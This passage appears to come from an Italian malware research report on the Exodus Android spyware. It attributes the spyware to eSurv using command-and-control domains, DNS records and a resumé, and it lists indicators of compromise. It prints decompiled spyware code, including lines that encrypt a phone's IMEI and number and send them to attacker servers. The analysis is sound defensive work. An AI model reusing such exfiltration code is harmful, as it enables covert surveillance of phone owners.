    public static final String CERT_STRING_B64 = "MIIDxzCCAq+gAwIBAgIJAM6NZPKxJWOzMA0GCSqGSIb3DQEBCwUAMHoxCzAJBgNVBAYTAkNOMRYwFAYDVQQIDA1GdW5nIFNoYW5nIEhvMRIwEAYDVQQHDAlIb25nIEtvbmcxGjAYBgNVBAoMEUNoaW5hIFRlbGVjb20gTHRkMSMwIQYDVQQDDBowMGludGVybmV0LWRldmVsLmlub2t1LmNvbTAeFw0xNjAzMTcxNTMwMTNaFw0yNjAzMTUxNTMwMTNaMHoxCzAJBgNVBAYTAkNOMRYwFAYDVQQIDA1GdW5nIFNoYW5nIEhvMRIwEAYDVQQHDAlIb25nIEtvbmcxGjAYBgNVBAoMEUNoaW5hIFRlbGVjb20gTHRkMSMwIQYDVQQDDBowMGludGVybmV0LWRldmVsLmlub2t1LmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMIJIK4rWDHeEnhjS5efXW2bpiX45BXaKPvULox4dzYiBUllFSAB4MujX3CZgu/fbBgNgIAV2n7h+KHfrBxlU0K9orIaZGEpiWLIJIXwS/1RY4dXnIdKmU2Dwogm9ZnJlzPLjJVM2iFDXj9dAm008PRo6UvGJ5g3GCs1xtCFErfDLvFiM2/hnlEPZtMFmLXonnQAALTjLwz+gD35IwFRiKgizDM0b0ZIhvMV+HPE/Zjot2rfsV/JI/uwvECVxUZNjs5GIMO2TwZAaK+B/PdLJY6iTcnmoxVscEXTDeYPpxu7o+R3GgbOYi1JOSBlDV3xAZhCdT5EHuoaWbyLJpm9xpkCAwEAAaNQME4wHQYDVR0OBBYEFMxK8XlJ1hzBGBvtwJL72q5Zk/hnMB8GA1UdIwQYMBaAFMxK8XlJ1hzBGBvtwJL72q5Zk/hnMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAJNvLXlxhBpu96dpPWqfvqkpf6iuByGr/VWgouJmh06g5/u4AgOYqhiZjJ1sm/yLt4/xnFDpwZIFVB7kDslXAgjim2eK5OIENigcrR6xcI+e/sd/PkGUlfEuKq8AZ+GUd4Ju2TK+ee7kh1keJKngRmLTo6Zk/G9iD2XycryUI3sjhx5UWGyZ+PNowDcGTjTPOQCLb9YXLPxS0zSEVQ55JJfabBlsmpFp/ePyEE240eiEW9DKKktKqK9KNjthExaCPnG3w00y6QTpkRQhY/rUord+/bHDuZ2Wk5dxOW1QK+Kjl1EJrDD+MBBlILgG82/gyiDaDSpEWfbn1O8KuieMxHk=";
    public static final String EXPLOIT_ARM = "07DD890F-8495-4E74-826F-BF7AED84B351";
    public static final String EXPLOIT_I686 = "6F6F8F3F-7996-44B4-AD92-4BB03D02D926";
    public static final String HOST_DIRECTORY = "/7e661733-e332-429a-a7e2-23649f27690f/";
    public static final String HOST_IP = "attiva.exodus.esurv.it";
    public static final String HOST_WS_BUNDLE1 = "B45551E5-8B53-4960-8B47-041A46D1B954";
    public static final String HOST_WS_BUNDLE2 = "6AD98532-7605-4DB0-9CE4-56816B203DBD";
    public static final String HOST_WS_INIT = "7acbff64-7a3a-4ebd-8997-4839b5937024";
    public static final String KEY_STRING_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7k5xg4sfzLcucmXE24jsI3fJ2+4vt3wVCR0WA3hfqDdlOx7EHWTKues1MLY1Cps8Y3nVId3E7GtzjTTlI++eHcoEd3eVXWdnGRtci+MB8O89HWLqhqCds/FmTkG4rdSF7oTlTcrKKwRs6QLqZceCQo00S9DXMNXIXOflXa4DTzH0LqlPcq8QTQGNKp8InC0fDsP02kGC4dNk1yNxCfJvVmXp06fYoLFrqYCofoBMkRkWTpTb83ibwdmE3LrzVLDwVNJHDCglgPKHvCPFex9+NRZIdzSDE6GxbuT+l+VbPYg8BpXjEtr68k81ZLFSnKrdSJLqtuJ0LvaTzEYxRikzzwIDAQAB";
    public static final String PLACEHOLDER_AFTER_FIRST_EXECUTION = "5CBAECF0-6D42-430C-99AD-9493EC45C566";
    public static final String UNZIPPED_FOLDER = "BD014144-796E-41B0-89C5-2EEC42765254";
}
```

In primo luogo possiamo notare che, invece di nomi di dominio generici o indirizzi IP, queste copie di *Exodus One* comunicavano con un server di Command & Control situato ad `attiva.exodus.esurv[.]it`.

```java
public static final String HOST_IP = "attiva.exodus.esurv.it";
```

*(Abbiamo chiamato lo spyware "Exodus" proprio per via di questo nome di dominio usato come Command & Control.)*

Di seguito è riportato il frammento di codice in questi vecchi campioni di *Exodus One* che mostrano la connessione al Command & Control:

```java
final byte[] encryptedBytes = StepOneCipher().doFinal((" " + "#" + imei + "#" + versione + "#" + telefono).getBytes());
final Request request = new Request.Builder().url("https://attiva.exodus.esurv.it/7e661733-e332-429a-a7e2-23649f27690f/7acbff64-7a3a-4ebd-8997-4839b5937024.php").post(RequestBody.create(MTYPE, encryptedBytes)).build();
```

Qui invece è riportata la composizione quasi identica della richiesta al server Command & Control in `mike.jar` (contenente anche l'idendica cartella `7e661733-e332-429a-a7e2-23649f27690f`):

```java
if (bArr == null) {
    bArr = l.c().doFinal((" " + "#" + deviceId + "#" + str3 + "#" + telephonyManager.getLine1Number()).getBytes());
}
Response execute = build.newCall(new Request.Builder().url("https://ws.my-local-weather[.]com/7e661733-e332-429a-a7e2-23649f27690f/" + str2 + ".php").post(RequestBody.create(a, bArr)).build()).execute();
```

Per confermare ulteriormente la connessione dello spyware Exodus con eSurv, il dominio `attiva.exodus.esurv.it` si risolve al dominio IP 212.47.242.236 che, secondo i dati di passive DNS pubblici, nel 2017 è stato utilizzato per ospitare il dominio `server1cs.exodus.connexxa.it`. Connexxa era una società anchessa di Catanzaro. Secondo informazioni disponibili pubblicamente, il fondatore di Connexxa sembra essere anche il CEO di eSurv.

È interessante notare che abbiamo trovato altri record DNS, per lo più del 2017, che seguono uno schema simile e sembrano contenere [codici a due lettere](http://www.comuni-italiani.it/province.html) per città d'Italia:

| Server | City |
|--------|------|
| server1**bo**.exodus.connexxa[.]it | Bologna |
| server1**bs**.exodus.connexxa[.]it | Brescia |
| server1**cs**.exodus.connexxa[.]it | Cosenza |
| server1**ct**.exodus.connexxa[.]it | Catania |
| server1fermo.exodus.connexxa[.]it | |
| server1**fi**.exodus.connexxa[.]it | Firenze |
| server1gioiat.exodus.connexxa[.]it | |
| server1**na**.exodus.connexxa[.]it | Napoli |
| server1**rc**.exodus.connexxa[.]it | Reggio Calabria |
| server2**ct**.exodus.connexxa[.]it | Catania |
| server2**cz**.exodus.connexxa[.]it | Catanzaro |
| server2**fi**.exodus.connexxa[.]it | Firenze |
| server2**mi**.exodus.connexxa[.]it | Milano |
| server2**rc**.exodus.connexxa[.]it | Reggio Calabria |
| server3**bo**.exodus.connexxa[.]it | Bologna |
| server3**ct**.exodus.connexxa[.]it | Catania |
| server3.exodus.connexxa[.]it | |
| server3**fi**.exodus.connexxa[.]it | Firenze |
| server4**fi**.exodus.connexxa[.]it | Firenze |
| serverrt.exodus.connexxa[.]it |  |


### Un Curriculum Vitae Pubblico Conferma Lo Sviluppo di un Agente per Android

Inoltre, un dipendente di eSurv ha descritto con molta precisione il proprio lavoro nello sviluppo di un "*agente per raccogliere dati da dispositivi Android e inviarli a un server C&C*" e nella ricerca di "*vulnerabilità nei dispositivi mobili (principalmente Android)*" in un curriculum vitae disponibile pubblicamente. Ulteriori dettagli in esso riflettono altre caratteristiche di Exodus (come il bypass dei power manager che abbiamo descritto da *Exodus One*, e altro ancora):

<img src="/images/esurv/resume.png" class="rounded-lg shadow-lg" />



## Indicators of Compromise

#### Exodus One
011b6bcebd543d4eb227e840f04e188fb01f2335b0b81684b60e6b45388d3820  
0f5f1409b1ebbee4aa837d20479732e11399d37f05b47b5359dc53a4001314e5  
2055584625d24687bd027a63bc0b8faa7d1a854a535de74afba24840a52b1d2f  
26fef238028ee4b5b8da631c77bfb44ada3d5db8129c45dea5df6a51c9ea5f55  
33a9da16d096426c82f150e39fc4f9172677885cfeaedcff10c86414e88be802  
34d000ee1e36efd10eb37e2b79d69249d5a85682a61390a89a1b9391c46bf2ba  
4f6146956b50ae3a6e80a1c1f771dba848ba677064eb0e166df5804ac2766898  
5db49122d866967295874ab2c1ce23a7cde50212ff044bbea1da9b49bb9bc149  
70e2eea5609c6954c61f2e5e0a3aea832d0643df93d18d7d78b6f9444dcceef0  
80810a8ec9624f317f832ac2e212dba033212258285344661e5da11b0d9f0b62  
8453ce501fee1ca8a321f16b09969c517f92a24b058ac5b54549eabd58bf1884  
a37f5d2418c5f2f64d06ba28fe62edee1293a56158ddfa9f04020e316054363f  
db59407f72666526fca23d31e3b4c5df86f25eff178e17221219216c6975c63f  
e0acbb0d7e55fb67e550a6bf5cf5c499a9960eaf5f037b785f9004585202593b  

#### Exodus One Package Names
com.phonecarrier.linecheck  
rm.rf  
operatore.italia  
it.offertetelefonicheperte  
it.servizipremium  
assistenza.sim  
assistenza.linea.riattiva  
assistenza.linea  
it.promofferte  

#### Exodus Two
64c11fdb317d6b7c9930e639f55863df592f23f3c7c861ddd97048891a90c64b  
a42a05bf9b412cd84ea92b166d790e8e72f1d01764f93b05ace62237fbabe40e  

#### Exodus Two ELF Utilities
00c787c0c0bc26caf623e66373a5aaa1b913b9caee1f34580bdfdd21954b7cc4  
11499ff2418f4523344de81a447f6786fdba4982057d4114f64db929990b4b59  
13ec6cec511297ac3137cf7d6e4a7c4f5dd2b24478a06262a44f13a3d61070b6  
3c9f08b3280851f54414dfa5a57f40d3b7be7b73736fa0ba21b078e75ce54d33  
3ee3a973c62ba5bd9eab595a7c94b7a26827c5fa5b21964d511ab58903929ec5  
47449a612697ad99a6fbd6e02a84e957557371151f2b034a411ebb10496648c8  
48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88  
824ad333320cbb7873dc49e61c14f749b0e0d88723635524463f2e6f56ea133a  
b46f282f9a1bce3798faee3212e28924730a657eb93cda3824c449868b6ee2e7  
c228a534535b22a316a97908595a2d793d0fecabadc32846c6d1bfb08ca9a658  
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  
e3f65f84dd6c2c3a5a653a3788d78920c0321526062a6b53daaf23fa57778a5f  

#### Command & Controls
ad1.fbsba[.]com  
ws.my-local-weather[.]com  
54.71.249[.]137  
54.69.156[.]31  
162.243.172[.]208  
attiva.exodus.esurv[.]it
